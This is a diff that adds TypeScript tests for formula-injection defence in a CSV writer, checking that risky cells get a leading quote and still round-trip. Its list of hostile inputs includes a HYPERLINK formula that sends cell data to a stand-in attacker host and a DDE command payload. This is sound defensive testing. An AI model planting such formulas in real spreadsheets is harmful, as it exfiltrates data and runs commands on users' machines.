@@ -183,3 +183,73 @@ test("a multi-byte character straddling the read boundary survives", (t) => {
   assert.ok(text.includes(`${"x".repeat(20)}🎬`), "the boundary row is intact");
   assert.ok(text.includes("日本語"));
 });
+
+// --- E-7: formula injection ---------------------------------------------------
+
+/** Minimal RFC 4180 reader for fully quoted fields, for the round trip below. */
+function parseQuotedCsv(text: string): string[][] {
+  const rows: string[][] = [];
+  let row: string[] = [];
+  let i = text.startsWith(CSV_BOM) ? 1 : 0;
+  while (i < text.length) {
+    if (text[i] !== '"') throw new Error(`expected quote at ${i}`);
+    let field = "";
+    i += 1;
+    for (;;) {
+      if (text[i] === '"' && text[i + 1] === '"') {
+        field += '"';
+        i += 2;
+      } else if (text[i] === '"') {
+        i += 1;
+        break;
+      } else field += text[i++];
+    }
+    row.push(field);
+    if (text[i] === ",") i += 1;
+    else if (text.startsWith("\r\n", i)) {
+      rows.push(row);
+      row = [];
+      i += 2;
+    }
+  }
+  return rows;
+}
+
+test("a cell that would read as a formula is neutralised with a leading quote", () => {
+  for (const evil of [
+    "=cmd reply",
+    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
+    "+1+1",
+    "-2-2",
+    "@SUM(1:1)",
+    "\t=1+1",
+    "\r=1+1",
+    "=cmd|' /C calc'!A1",
+  ]) {
+    const cell = csvCell(evil);
+    assert.ok(
+      cell.startsWith(`"'`),
+      `${JSON.stringify(evil)} was written as ${cell}`,
+    );
+  }
+});
+
+test("ordinary text, numbers and negative numbers are not altered", () => {
+  assert.equal(csvCell("hello"), '"hello"');
+  assert.equal(csvCell("a=b"), '"a=b"');
+  assert.equal(csvCell(-5), '"-5"');
+  assert.equal(csvCell("-5"), '"-5"');
+  assert.equal(csvCell(null), '""');
+});
+
+test("neutralised cells still round-trip through an RFC 4180 reader", () => {
+  const values = ['=1+1, "quoted"\r\nnext line', "@x", 'plain, "q"', "日本語 🎬"];
+  const text = values.map(csvCell).join(",") + "\r\n";
+  const [row] = parseQuotedCsv(text);
+  assert.deepEqual(row, [
+    `'=1+1, "quoted"\r\nnext line`,
+    "'@x",
+    'plain, "q"',
+    "日本語 🎬",
+  ]);
+});
